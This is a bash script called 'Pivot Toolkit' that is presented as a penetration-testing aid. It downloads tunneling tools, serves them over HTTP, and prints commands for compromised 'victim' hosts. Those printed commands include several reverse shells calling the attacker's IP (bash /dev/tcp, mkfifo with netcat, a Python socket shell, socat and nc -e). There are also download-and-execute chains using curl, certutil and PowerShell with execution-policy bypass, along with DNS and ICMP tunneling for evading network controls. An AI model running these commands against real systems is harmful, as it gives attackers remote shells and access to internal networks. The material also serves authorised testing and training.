#!/bin/bash
#===============================================================================
# PIVOT TOOLKIT v3.0 - Production Ready
# Reliable pivoting tool server for penetration testing
# Usage: curl -sL URL | bash  OR  bash pivot.sh
#===============================================================================

set -o pipefail

# Configuration
VERSION="3.0"
WORK_DIR="/tmp/pivot_$$"
CHISEL_VERSION="1.10.1"
LIGOLO_VERSION="0.7.5"

# Tool ports (configurable)
CHISEL_PORT="${CHISEL_PORT:-9001}"
LIGOLO_PORT="${LIGOLO_PORT:-11601}"
CALLBACK_PORT="${CALLBACK_PORT:-4444}"

#===============================================================================
# CORE FUNCTIONS
#===============================================================================

log_info() { echo "[+] $1"; }
log_warn() { echo "[!] $1"; }
log_error() { echo "[-] $1"; }
log_cmd() { echo "    $1"; }
log_note() { echo "    # $1"; }

print_section() {
    echo ""
    echo "============================================================"
    echo " $1"
    echo "============================================================"
}

print_subsection() {
    echo ""
    echo "--- $1 ---"
}

# Read input - works in pipe mode and interactive
get_input() {
    local prompt="$1"
    local default="$2"
    local result=""
    
    if [ -t 0 ]; then
        read -r -p "$prompt" result
    elif [ -e /dev/tty ]; then
        read -r -p "$prompt" result < /dev/tty
    else
        result="$default"
    fi
    
    echo "${result:-$default}"
}

# Detect primary IP address
detect_ip() {
    # Try tun0 first (VPN), then common interfaces
    for iface in tun0 tap0 eth0 ens33 ens34 enp0s3 enp0s8 wlan0; do
        local ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
        if [ -n "$ip" ]; then
            echo "$ip"
            return 0
        fi
    done
    
    # Fallback to first global IP
    ip -4 addr show scope global 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1
}

# Find available port
find_port() {
    local start="${1:-8000}"
    local end="${2:-9000}"
    
    for port in $(seq $start $end); do
        if ! (ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null) | grep -q ":${port} "; then
            echo "$port"
            return 0
        fi
    done
    
    # Random fallback
    echo $((RANDOM % 10000 + 10000))
}

# Download with retry and multiple methods
download() {
    local url="$1"
    local output="$2"
    local retries=3
    
    for i in $(seq 1 $retries); do
        # Try curl
        if command -v curl &>/dev/null; then
            if curl -fsSL --connect-timeout 30 -o "$output" "$url" 2>/dev/null; then
                [ -s "$output" ] && return 0
            fi
        fi
        
        # Try wget
        if command -v wget &>/dev/null; then
            if wget -q --timeout=30 -O "$output" "$url" 2>/dev/null; then
                [ -s "$output" ] && return 0
            fi
        fi
        
        sleep 1
    done
    
    return 1
}

# Extract gzip
extract_gz() {
    local input="$1"
    local output="$2"
    
    if command -v gunzip &>/dev/null; then
        gunzip -c "$input" > "$output" 2>/dev/null && chmod +x "$output" && return 0
    elif command -v gzip &>/dev/null; then
        gzip -dc "$input" > "$output" 2>/dev/null && chmod +x "$output" && return 0
    fi
    return 1
}

# Cleanup on exit
cleanup() {
    rm -rf "$WORK_DIR" 2>/dev/null
}
trap cleanup EXIT

#===============================================================================
# FILE TRANSFER METHODS - Comprehensive
#===============================================================================

show_transfer_methods() {
    local file="$1"
    local full_url="http://$IP:$HTTP_PORT/$file"
    
    print_subsection "TRANSFER METHODS FOR: $file"
    
    echo ""
    echo "LINUX DOWNLOAD METHODS:"
    echo ""
    log_cmd "# Method 1: curl"
    log_cmd "curl -o /tmp/$file $full_url"
    echo ""
    log_cmd "# Method 2: wget"
    log_cmd "wget -O /tmp/$file $full_url"
    echo ""
    log_cmd "# Method 3: curl with execution"
    log_cmd "curl -o /tmp/$file $full_url && chmod +x /tmp/$file"
    echo ""
    log_cmd "# Method 4: Python (if curl/wget unavailable)"
    log_cmd "python3 -c \"import urllib.request; urllib.request.urlretrieve('$full_url', '/tmp/$file')\""
    log_cmd "python -c \"import urllib; urllib.urlretrieve('$full_url', '/tmp/$file')\""
    echo ""
    log_cmd "# Method 5: Perl"
    log_cmd "perl -e 'use LWP::Simple; getstore(\"$full_url\", \"/tmp/$file\")'"
    echo ""
    log_cmd "# Method 6: PHP"
    log_cmd "php -r \"file_put_contents('/tmp/$file', file_get_contents('$full_url'));\""
    echo ""
    log_cmd "# Method 7: Ruby"
    log_cmd "ruby -e \"require 'open-uri'; File.write('/tmp/$file', URI.open('$full_url').read)\""
    echo ""
    log_cmd "# Method 8: Netcat (start: nc -lvnp $HTTP_PORT < $file on attacker)"
    log_cmd "nc $IP $HTTP_PORT > /tmp/$file"
    echo ""
    log_cmd "# Method 9: /dev/tcp (Bash built-in)"
    log_cmd "cat < /dev/tcp/$IP/$HTTP_PORT > /tmp/$file"
    echo ""
    log_cmd "# Method 10: Base64 (copy-paste through limited shell)"
    log_cmd "echo 'BASE64_CONTENT' | base64 -d > /tmp/$file"
    log_note "Generate base64: base64 -w0 $file"
    
    echo ""
    echo "WINDOWS DOWNLOAD METHODS:"
    echo ""
    log_cmd "# Method 1: certutil"
    log_cmd "certutil -urlcache -f $full_url %TEMP%\\$file"
    echo ""
    log_cmd "# Method 2: PowerShell Invoke-WebRequest"
    log_cmd "powershell -c \"iwr -uri $full_url -outfile \$env:TEMP\\$file\""
    echo ""
    log_cmd "# Method 3: PowerShell WebClient"
    log_cmd "powershell -c \"(New-Object Net.WebClient).DownloadFile('$full_url','\$env:TEMP\\$file')\""
    echo ""
    log_cmd "# Method 4: PowerShell Start-BitsTransfer"
    log_cmd "powershell -c \"Start-BitsTransfer -Source $full_url -Destination \$env:TEMP\\$file\""
    echo ""
    log_cmd "# Method 5: bitsadmin"
    log_cmd "bitsadmin /transfer job /download /priority high $full_url %TEMP%\\$file"
    echo ""
    log_cmd "# Method 6: PowerShell (bypass execution policy)"
    log_cmd "powershell -ep bypass -c \"iwr $full_url -o \$env:TEMP\\$file\""
    echo ""
    log_cmd "# Method 7: curl (Windows 10+)"
    log_cmd "curl -o %TEMP%\\$file $full_url"
    echo ""
    log_cmd "# Method 8: wget (if installed)"
    log_cmd "wget -O %TEMP%\\$file $full_url"
}

#===============================================================================
# CHISEL
#===============================================================================

download_chisel() {
    log_info "Downloading Chisel Linux agent..."
    if download "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VERSION}/chisel_${CHISEL_VERSION}_linux_amd64.gz" "chisel.gz"; then
        extract_gz "chisel.gz" "chisel_linux" && rm -f "chisel.gz"
        log_info "Chisel Linux ready"
    else
        log_error "Failed to download Chisel Linux"
    fi
    
    log_info "Downloading Chisel Windows agent..."
    if download "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VERSION}/chisel_${CHISEL_VERSION}_windows_amd64.gz" "chisel_win.gz"; then
        extract_gz "chisel_win.gz" "chisel.exe" && rm -f "chisel_win.gz"
        log_info "Chisel Windows ready"
    else
        log_error "Failed to download Chisel Windows"
    fi
    
    # Install server locally if not present
    if ! command -v chisel &>/dev/null; then
        log_info "Installing Chisel server locally..."
        download "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VERSION}/chisel_${CHISEL_VERSION}_linux_amd64.gz" "/tmp/chisel_srv.gz"
        extract_gz "/tmp/chisel_srv.gz" "/tmp/chisel_srv"
        if [ -w /usr/local/bin ]; then
            mv /tmp/chisel_srv /usr/local/bin/chisel
        else
            mkdir -p ~/bin
            mv /tmp/chisel_srv ~/bin/chisel
            export PATH=~/bin:$PATH
        fi
        rm -f /tmp/chisel_srv.gz
    fi
}

show_chisel() {
    print_section "CHISEL - SOCKS PROXY OVER HTTP"
    
    echo ""
    echo "STEP 1: START SERVER ON ATTACKER (run this first in another terminal)"
    echo ""
    log_cmd "chisel server -p $CHISEL_PORT --reverse"
    log_note "This starts listening for client connections"
    
    echo ""
    echo "STEP 2: DOWNLOAD AND RUN CLIENT ON VICTIM"
    echo ""
    echo "Linux:"
    log_cmd "curl -o /tmp/c http://$IP:$HTTP_PORT/chisel_linux && chmod +x /tmp/c && /tmp/c client $IP:$CHISEL_PORT R:socks"
    log_cmd "wget -O /tmp/c http://$IP:$HTTP_PORT/chisel_linux && chmod +x /tmp/c && /tmp/c client $IP:$CHISEL_PORT R:socks"
    echo ""
    echo "Windows:"
    log_cmd "certutil -urlcache -f http://$IP:$HTTP_PORT/chisel.exe %TEMP%\\c.exe && %TEMP%\\c.exe client $IP:$CHISEL_PORT R:socks"
    log_cmd "powershell -ep bypass -c \"iwr http://$IP:$HTTP_PORT/chisel.exe -o \$env:TEMP\\c.exe; & \$env:TEMP\\c.exe client $IP:$CHISEL_PORT R:socks\""
    
    echo ""
    echo "STEP 3: USE PROXYCHAINS ON ATTACKER"
    echo ""
    log_cmd "# Add to /etc/proxychains4.conf (or /etc/proxychains.conf):"
    log_cmd "socks5 127.0.0.1 1080"
    echo ""
    log_cmd "# Then use proxychains with any tool:"
    log_cmd "proxychains nmap -sT -Pn <INTERNAL_TARGET>"
    log_cmd "proxychains curl http://<INTERNAL_TARGET>"
    log_cmd "proxychains ssh user@<INTERNAL_TARGET>"
    log_cmd "proxychains evil-winrm -i <INTERNAL_TARGET> -u user -p pass"
    
    print_subsection "CHISEL - SPECIFIC PORT FORWARD (Alternative to SOCKS)"
    echo ""
    log_note "Forward specific port instead of full SOCKS proxy"
    echo ""
    echo "Attacker:"
    log_cmd "chisel server -p $CHISEL_PORT --reverse"
    echo ""
    echo "Victim (forward RDP):"
    log_cmd "./chisel_linux client $IP:$CHISEL_PORT R:3389:<INTERNAL_TARGET>:3389"
    echo ""
    echo "Then connect:"
    log_cmd "xfreerdp /v:127.0.0.1:3389 /u:user /p:pass"
    
    print_subsection "CHISEL - MULTIPLE PORT FORWARDS"
    echo ""
    log_cmd "./chisel_linux client $IP:$CHISEL_PORT R:3389:<TARGET1>:3389 R:445:<TARGET2>:445 R:22:<TARGET3>:22"
    
    show_transfer_methods "chisel_linux"
}

#===============================================================================
# LIGOLO-NG
#===============================================================================

download_ligolo() {
    log_info "Downloading Ligolo-ng Linux agent..."
    if download "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VERSION}/ligolo-ng_agent_${LIGOLO_VERSION}_linux_amd64.tar.gz" "ligolo_agent.tar.gz"; then
        tar xzf ligolo_agent.tar.gz 2>/dev/null
        mv agent ligolo_linux 2>/dev/null && chmod +x ligolo_linux
        rm -f ligolo_agent.tar.gz LICENSE README.md 2>/dev/null
        log_info "Ligolo-ng Linux agent ready"
    else
        log_error "Failed to download Ligolo-ng Linux agent"
    fi
    
    log_info "Downloading Ligolo-ng Windows agent..."
    if download "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VERSION}/ligolo-ng_agent_${LIGOLO_VERSION}_windows_amd64.zip" "ligolo_agent.zip"; then
        unzip -qo ligolo_agent.zip 2>/dev/null
        mv agent.exe ligolo.exe 2>/dev/null
        rm -f ligolo_agent.zip LICENSE README.md 2>/dev/null
        log_info "Ligolo-ng Windows agent ready"
    else
        log_error "Failed to download Ligolo-ng Windows agent"
    fi
    
    # Install proxy locally if not present
    if ! command -v ligolo-ng &>/dev/null && ! command -v ligolo-proxy &>/dev/null; then
        log_info "Installing Ligolo-ng proxy locally..."
        download "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VERSION}/ligolo-ng_proxy_${LIGOLO_VERSION}_linux_amd64.tar.gz" "/tmp/ligolo_proxy.tar.gz"
        tar xzf /tmp/ligolo_proxy.tar.gz -C /tmp 2>/dev/null
        if [ -w /usr/local/bin ]; then
            mv /tmp/proxy /usr/local/bin/ligolo-ng 2>/dev/null
        else
            mkdir -p ~/bin
            mv /tmp/proxy ~/bin/ligolo-ng 2>/dev/null
            export PATH=~/bin:$PATH
        fi
        rm -f /tmp/ligolo_proxy.tar.gz /tmp/LICENSE /tmp/README.md 2>/dev/null
    fi
}

show_ligolo() {
    print_section "LIGOLO-NG - TUN INTERFACE (Direct Routing, No Proxychains)"
    
    echo ""
    echo "STEP 1: CREATE TUN INTERFACE ON ATTACKER (one-time setup, requires root)"
    echo ""
    log_cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo"
    log_cmd "sudo ip link set ligolo up"
    log_note "This creates a virtual network interface"
    
    echo ""
    echo "STEP 2: START LIGOLO PROXY ON ATTACKER (run this in a terminal)"
    echo ""
    log_cmd "ligolo-ng -selfcert -laddr 0.0.0.0:$LIGOLO_PORT"
    log_note "Keep this running - it will show connected agents"
    
    echo ""
    echo "STEP 3: DOWNLOAD AND RUN AGENT ON VICTIM"
    echo ""
    echo "Linux:"
    log_cmd "curl -o /tmp/a http://$IP:$HTTP_PORT/ligolo_linux && chmod +x /tmp/a && /tmp/a -connect $IP:$LIGOLO_PORT -ignore-cert"
    log_cmd "wget -O /tmp/a http://$IP:$HTTP_PORT/ligolo_linux && chmod +x /tmp/a && /tmp/a -connect $IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo "Windows:"
    log_cmd "certutil -urlcache -f http://$IP:$HTTP_PORT/ligolo.exe %TEMP%\\a.exe && %TEMP%\\a.exe -connect $IP:$LIGOLO_PORT -ignore-cert"
    log_cmd "powershell -ep bypass -c \"iwr http://$IP:$HTTP_PORT/ligolo.exe -o \$env:TEMP\\a.exe; & \$env:TEMP\\a.exe -connect $IP:$LIGOLO_PORT -ignore-cert\""
    
    echo ""
    echo "STEP 4: IN LIGOLO CONSOLE - SELECT SESSION AND VIEW NETWORKS"
    echo ""
    log_cmd "session"
    log_note "Lists all connected agents - press Enter to select"
    log_cmd "ifconfig"
    log_note "Shows victim's network interfaces - note the internal subnet (e.g., 172.16.5.0/24)"
    
    echo ""
    echo "STEP 5: ADD ROUTE ON ATTACKER (new terminal, requires root)"
    echo ""
    log_cmd "sudo ip route add 172.16.5.0/24 dev ligolo"
    log_note "Replace 172.16.5.0/24 with the actual internal subnet from ifconfig"
    log_note "Add multiple routes if victim has multiple internal networks"
    
    echo ""
    echo "STEP 6: START TUNNEL IN LIGOLO CONSOLE"
    echo ""
    log_cmd "start"
    log_note "Now traffic to internal network routes through the tunnel"
    
    echo ""
    echo "STEP 7: ACCESS INTERNAL NETWORK DIRECTLY (no proxychains needed!)"
    echo ""
    log_cmd "nmap -sT -Pn 172.16.5.19"
    log_cmd "curl http://172.16.5.19"
    log_cmd "ssh user@172.16.5.19"
    log_cmd "xfreerdp /v:172.16.5.19 /u:user /p:pass"
    log_cmd "crackmapexec smb 172.16.5.0/24"
    log_cmd "evil-winrm -i 172.16.5.19 -u user -p pass"
    
    print_subsection "LIGOLO - REVERSE PORT FORWARD (Catch shells from internal hosts)"
    echo ""
    log_note "In ligolo console, create listener to catch reverse shells:"
    log_cmd "listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444"
    log_note "Internal hosts connecting to pivot:4444 reach your localhost:4444"
    echo ""
    log_cmd "# On attacker, start listener:"
    log_cmd "nc -lvnp 4444"
    echo ""
    log_cmd "# Payload on internal host connects to pivot's internal IP:"
    log_cmd "bash -i >& /dev/tcp/172.16.5.X/4444 0>&1"
    
    print_subsection "LIGOLO - USEFUL COMMANDS"
    echo ""
    log_cmd "session          # List/select sessions"
    log_cmd "ifconfig         # Show victim's interfaces"
    log_cmd "start            # Start tunnel"
    log_cmd "stop             # Stop tunnel"
    log_cmd "listener_add     # Add reverse port forward"
    log_cmd "listener_list    # List listeners"
    log_cmd "listener_del ID  # Remove listener"
    
    print_subsection "LIGOLO - DOUBLE PIVOT"
    echo ""
    log_note "To pivot through a second host deeper in the network:"
    echo ""
    log_cmd "# Run agent on 2nd host, connecting to 1st pivot's INTERNAL IP:"
    log_cmd "./agent -connect 172.16.5.X:$LIGOLO_PORT -ignore-cert"
    echo ""
    log_cmd "# Add route for deeper network:"
    log_cmd "sudo ip route add 10.10.10.0/24 dev ligolo"
    
    print_subsection "LIGOLO - TROUBLESHOOTING"
    echo ""
    log_cmd "ip link show ligolo      # Check if TUN exists"
    log_cmd "ip route                 # Check routes"
    log_cmd "ip route del <subnet>    # Remove conflicting route"
    
    show_transfer_methods "ligolo_linux"
}

#===============================================================================
# SOCAT
#===============================================================================

download_socat() {
    log_info "Downloading Socat..."
    if download "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" "socat_linux"; then
        chmod +x socat_linux
        log_info "Socat ready"
    else
        log_error "Failed to download Socat"
    fi
}

show_socat() {
    print_section "SOCAT - PORT FORWARDING & SHELLS"
    
    echo ""
    echo "REVERSE SHELL:"
    echo ""
    echo "Step 1 - Attacker (start listener first):"
    log_cmd "nc -lvnp $CALLBACK_PORT"
    log_note "Or for full TTY: socat file:\$(tty),raw,echo=0 TCP-LISTEN:$CALLBACK_PORT"
    echo ""
    echo "Step 2 - Victim:"
    log_cmd "curl -o /tmp/s http://$IP:$HTTP_PORT/socat_linux && chmod +x /tmp/s && /tmp/s TCP:$IP:$CALLBACK_PORT EXEC:/bin/bash"
    echo ""
    log_note "Full TTY shell:"
    log_cmd "/tmp/s TCP:$IP:$CALLBACK_PORT EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
    
    print_subsection "SOCAT - PORT FORWARDING"
    echo ""
    log_note "Forward local port to remote target:"
    log_cmd "/tmp/s TCP-LISTEN:8080,fork TCP:<TARGET>:80"
    log_note "Now connections to victim:8080 forward to TARGET:80"
    echo ""
    log_note "Bind to specific interface:"
    log_cmd "/tmp/s TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:<TARGET>:80"
    
    print_subsection "SOCAT - UDP FORWARDING"
    echo ""
    log_cmd "/tmp/s UDP-LISTEN:53,fork UDP:8.8.8.8:53"
    
    show_transfer_methods "socat_linux"
}

#===============================================================================
# NETCAT
#===============================================================================

download_netcat() {
    log_info "Downloading Netcat..."
    if download "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" "nc_linux"; then
        chmod +x nc_linux
        log_info "Netcat ready"
    else
        log_error "Failed to download Netcat"
    fi
}

show_netcat() {
    print_section "NETCAT - REVERSE SHELLS"
    
    echo ""
    echo "Step 1 - Attacker (start listener first):"
    log_cmd "nc -lvnp $CALLBACK_PORT"
    echo ""
    echo "Step 2 - Victim:"
    log_cmd "curl -o /tmp/n http://$IP:$HTTP_PORT/nc_linux && chmod +x /tmp/n && /tmp/n $IP $CALLBACK_PORT -e /bin/bash"
    
    print_subsection "ALTERNATIVE SHELLS (if -e not supported)"
    echo ""
    log_cmd "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $CALLBACK_PORT > /tmp/f"
    log_cmd "bash -i >& /dev/tcp/$IP/$CALLBACK_PORT 0>&1"
    log_cmd "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$IP\",$CALLBACK_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    
    show_transfer_methods "nc_linux"
}

#===============================================================================
# PLINK
#===============================================================================

download_plink() {
    log_info "Downloading Plink..."
    if download "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" "plink.exe"; then
        log_info "Plink ready"
    else
        log_error "Failed to download Plink"
    fi
}

show_plink() {
    print_section "PLINK - WINDOWS SSH TUNNELING"
    
    echo ""
    echo "PREREQUISITE: SSH server running on attacker"
    log_cmd "sudo systemctl start ssh"
    log_cmd "sudo systemctl status ssh"
    
    echo ""
    echo "DYNAMIC SOCKS PROXY:"
    echo ""
    echo "Step 1 - Download on victim:"
    log_cmd "certutil -urlcache -f http://$IP:$HTTP_PORT/plink.exe %TEMP%\\p.exe"
    echo ""
    echo "Step 2 - Create tunnel:"
    log_cmd "%TEMP%\\p.exe -ssh $IP -l <SSH_USER> -pw <SSH_PASS> -D 9050 -N"
    log_note "Configure apps to use SOCKS5 proxy: 127.0.0.1:9050"
    
    print_subsection "PLINK - LOCAL PORT FORWARD"
    echo ""
    log_cmd "%TEMP%\\p.exe -ssh $IP -l <USER> -pw <PASS> -L 8080:<INTERNAL_TARGET>:80 -N"
    log_note "Access http://localhost:8080 to reach internal target"
    
    print_subsection "PLINK - REVERSE PORT FORWARD"
    echo ""
    log_cmd "%TEMP%\\p.exe -ssh $IP -l <USER> -pw <PASS> -R 4444:127.0.0.1:4444 -N"
    log_note "Makes your attacker:4444 accessible from Windows host"
    
    show_transfer_methods "plink.exe"
}

#===============================================================================
# SSH TUNNELING GUIDE
#===============================================================================

show_ssh_guide() {
    print_section "SSH TUNNELING GUIDE"
    
    print_subsection "LOCAL PORT FORWARD (-L)"
    log_note "Access remote service through SSH tunnel"
    echo ""
    log_cmd "ssh -L 8080:<INTERNAL_TARGET>:80 user@pivot_host"
    log_note "Now localhost:8080 reaches INTERNAL_TARGET:80"
    echo ""
    log_cmd "# Multiple ports:"
    log_cmd "ssh -L 8080:<TARGET>:80 -L 3389:<TARGET>:3389 user@pivot"
    
    print_subsection "DYNAMIC PORT FORWARD (-D) - SOCKS PROXY"
    log_note "Create SOCKS proxy for any destination"
    echo ""
    log_cmd "ssh -D 9050 user@pivot_host"
    echo ""
    log_cmd "# Configure proxychains:"
    log_cmd "echo 'socks5 127.0.0.1 9050' >> /etc/proxychains4.conf"
    echo ""
    log_cmd "# Use:"
    log_cmd "proxychains nmap -sT -Pn <INTERNAL_TARGET>"
    
    print_subsection "REMOTE/REVERSE PORT FORWARD (-R)"
    log_note "Make your local port accessible on remote host"
    echo ""
    log_cmd "# On attacker, start listener:"
    log_cmd "nc -lvnp 4444"
    echo ""
    log_cmd "# SSH with reverse forward:"
    log_cmd "ssh -R <PIVOT_INTERNAL_IP>:4444:127.0.0.1:4444 user@pivot_host -N"
    log_note "Internal hosts connecting to PIVOT_INTERNAL_IP:4444 reach your listener"
    
    print_subsection "SSHUTTLE - VPN OVER SSH"
    log_note "Routes traffic like VPN - no proxychains needed"
    echo ""
    log_cmd "sudo apt install sshuttle"
    log_cmd "sudo sshuttle -r user@pivot_host 172.16.5.0/24"
    echo ""
    log_cmd "# Now directly access:"
    log_cmd "nmap -sT 172.16.5.19"
    log_cmd "curl http://172.16.5.19"
    
    print_subsection "SSH OPTIONS"
    echo ""
    log_cmd "-N    # Don't execute remote command (tunnel only)"
    log_cmd "-f    # Background after authentication"
    log_cmd "-v    # Verbose (debug)"
    log_cmd "-o StrictHostKeyChecking=no    # Skip host key check"
}

#===============================================================================
# NETSH GUIDE (WINDOWS)
#===============================================================================

show_netsh_guide() {
    print_section "NETSH PORT FORWARDING (Windows Native)"
    
    log_note "Built into Windows - no tools needed! Requires Administrator."
    
    print_subsection "CREATE PORT FORWARD"
    echo ""
    log_cmd "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=<INTERNAL_TARGET>"
    log_note "Connections to pivot:8080 forward to INTERNAL_TARGET:3389"
    
    print_subsection "COMMON FORWARDS"
    echo ""
    log_cmd "# RDP"
    log_cmd "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=<TARGET>"
    echo ""
    log_cmd "# SMB"  
    log_cmd "netsh interface portproxy add v4tov4 listenport=8445 listenaddress=0.0.0.0 connectport=445 connectaddress=<TARGET>"
    echo ""
    log_cmd "# WinRM"
    log_cmd "netsh interface portproxy add v4tov4 listenport=5986 listenaddress=0.0.0.0 connectport=5985 connectaddress=<TARGET>"
    echo ""
    log_cmd "# HTTP"
    log_cmd "netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=80 connectaddress=<TARGET>"
    
    print_subsection "MANAGEMENT"
    echo ""
    log_cmd "netsh interface portproxy show v4tov4     # List all"
    log_cmd "netsh interface portproxy reset           # Remove ALL"
    log_cmd "netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0"
    
    print_subsection "FIREWALL (if blocked)"
    echo ""
    log_cmd "netsh advfirewall firewall add rule name=\"Pivot\" dir=in action=allow protocol=tcp localport=8080"
    
    print_subsection "CONNECT THROUGH PIVOT"
    echo ""
    log_cmd "xfreerdp /v:<PIVOT_IP>:8080 /u:user /p:pass"
    log_cmd "smbclient -L //<PIVOT_IP> -p 8445 -U user"
    log_cmd "evil-winrm -i <PIVOT_IP> -P 5986 -u user -p pass"
}

#===============================================================================
# DNS TUNNELING GUIDE
#===============================================================================

show_dns_guide() {
    print_section "DNS TUNNELING (dnscat2)"
    
    log_note "Tunnel traffic over DNS queries - useful when only DNS allowed"
    
    print_subsection "SERVER SETUP (Attacker)"
    echo ""
    log_cmd "git clone https://github.com/iagox86/dnscat2.git"
    log_cmd "cd dnscat2/server && sudo gem install bundler && sudo bundle install"
    log_cmd "sudo ruby dnscat2.rb --dns host=$IP,port=53,domain=yourdomain.com --no-cache"
    
    print_subsection "WINDOWS CLIENT"
    echo ""
    log_cmd "git clone https://github.com/lukebaggett/dnscat2-powershell.git"
    echo ""
    log_cmd "# On Windows:"
    log_cmd "Import-Module .\\dnscat2.ps1"
    log_cmd "Start-Dnscat2 -DNSserver $IP -Domain yourdomain.com -PreSharedSecret <SECRET> -Exec cmd"
    
    print_subsection "LINUX CLIENT"
    echo ""
    log_cmd "cd dnscat2/client && make"
    log_cmd "./dnscat --dns server=$IP,port=53 --secret=<SECRET>"
    
    print_subsection "INTERACT"
    echo ""
    log_cmd "window -i 1     # Connect to session"
    log_cmd "shell           # Get shell"
    log_cmd "download file   # Download"
    log_cmd "upload file     # Upload"
}

#===============================================================================
# ICMP TUNNELING GUIDE
#===============================================================================

show_icmp_guide() {
    print_section "ICMP TUNNELING (ptunnel-ng)"
    
    log_note "Tunnel traffic inside ICMP ping packets"
    
    print_subsection "BUILD PTUNNEL-NG"
    echo ""
    log_cmd "git clone https://github.com/utoni/ptunnel-ng.git"
    log_cmd "cd ptunnel-ng && sudo apt install automake autoconf -y && ./autogen.sh"
    
    print_subsection "SERVER (Pivot Host)"
    echo ""
    log_cmd "sudo ./ptunnel-ng -r<PIVOT_IP> -R22"
    
    print_subsection "CLIENT (Attacker)"
    echo ""
    log_cmd "sudo ./ptunnel-ng -p<PIVOT_IP> -l2222 -r<PIVOT_IP> -R22"
    
    print_subsection "CONNECT"
    echo ""
    log_cmd "ssh -p2222 user@127.0.0.1"
    log_cmd "ssh -D 9050 -p2222 user@127.0.0.1    # SOCKS proxy through ICMP"
}

#===============================================================================
# SOCKSOVERRDP GUIDE
#===============================================================================

show_socksoverrdp_guide() {
    print_section "SOCKSOVERRDP (Windows-to-Windows Pivoting)"
    
    log_note "SOCKS proxy through RDP's Dynamic Virtual Channels"
    
    print_subsection "DOWNLOAD TOOLS"
    echo ""
    log_cmd "mkdir ~/shared && cd ~/shared"
    log_cmd "curl -sLO https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip"
    log_cmd "curl -sLO https://www.proxifier.com/download/ProxifierPE.zip"
    log_cmd "unzip '*.zip'"
    
    print_subsection "RDP WITH SHARED FOLDER"
    echo ""
    log_cmd "xfreerdp /v:<PIVOT_IP> /u:<USER> /p:<PASS> /drive:shared,~/shared"
    
    print_subsection "ON WINDOWS PIVOT"
    echo ""
    log_cmd "regsvr32.exe \\\\tsclient\\shared\\SocksOverRDP-Plugin.dll"
    echo ""
    log_note "Then RDP to internal host:"
    log_cmd "mstsc.exe /v:<INTERNAL_TARGET>"
    log_note "SocksOverRDP popup shows proxy on 127.0.0.1:1080"
    
    print_subsection "USE PROXIFIER"
    echo ""
    log_note "Run ProxifierPE.exe, add SOCKS5 proxy: 127.0.0.1:1080"
    log_note "All Windows apps now route through internal network"
}

#===============================================================================
# HTTP SERVER
#===============================================================================

start_server() {
    print_section "HTTP FILE SERVER"
    
    echo ""
    echo "Files available:"
    ls -lh 2>/dev/null | grep -v "^total\|^d" | awk '{print "  " $9 " (" $5 ")"}'
    
    echo ""
    echo "============================================================"
    echo " SERVING: http://$IP:$HTTP_PORT/"
    echo " Press Ctrl+C to stop"
    echo "============================================================"
    echo ""
    
    if command -v python3 &>/dev/null; then
        # Suppress BrokenPipeError messages
        python3 -m http.server $HTTP_PORT 2>&1 | grep -v "BrokenPipeError\|Exception occurred"
    elif command -v python &>/dev/null; then
        python -m SimpleHTTPServer $HTTP_PORT 2>&1 | grep -v "BrokenPipeError"
    elif command -v php &>/dev/null; then
        php -S 0.0.0.0:$HTTP_PORT
    else
        log_error "No HTTP server available. Files are in: $WORK_DIR"
        log_info "Transfer files manually or install python3"
        read -p "Press Enter to exit..." < /dev/tty 2>/dev/null || true
    fi
}

#===============================================================================
# MAIN
#===============================================================================

main() {
    clear
    echo ""
    echo "============================================================"
    echo " PIVOT TOOLKIT v$VERSION"
    echo "============================================================"
    
    # Detect and get IP
    local detected=$(detect_ip)
    if [ -n "$detected" ]; then
        IP=$(get_input "[?] Your IP [$detected]: " "$detected")
    else
        IP=$(get_input "[?] Your IP: " "")
    fi
    
    if [ -z "$IP" ]; then
        log_error "IP address required"
        exit 1
    fi
    
    # Find available port for HTTP server
    HTTP_PORT=$(find_port 8000 9000)
    log_info "HTTP server port: $HTTP_PORT"
    
    # Create work directory
    rm -rf "$WORK_DIR" 2>/dev/null
    mkdir -p "$WORK_DIR" && cd "$WORK_DIR" || exit 1
    
    # Menu
    print_section "SELECT OPTION"
    echo ""
    echo "  DOWNLOAD & SERVE TOOLS:"
    echo "    1) Chisel        - SOCKS proxy over HTTP"
    echo "    2) Ligolo-ng     - TUN interface (direct routing)"
    echo "    3) Socat         - Port forwarding & shells"
    echo "    4) Netcat        - Reverse shells"
    echo "    5) Plink         - Windows SSH tunneling"
    echo "    6) All tools"
    echo ""
    echo "  GUIDES ONLY (no download):"
    echo "    7) SSH Tunneling"
    echo "    8) Netsh (Windows native)"
    echo "    9) DNS Tunneling (dnscat2)"
    echo "   10) ICMP Tunneling (ptunnel-ng)"
    echo "   11) SocksOverRDP"
    echo ""
    echo "    0) Exit"
    echo ""
    
    CHOICE=$(get_input "[?] Choice: " "0")
    
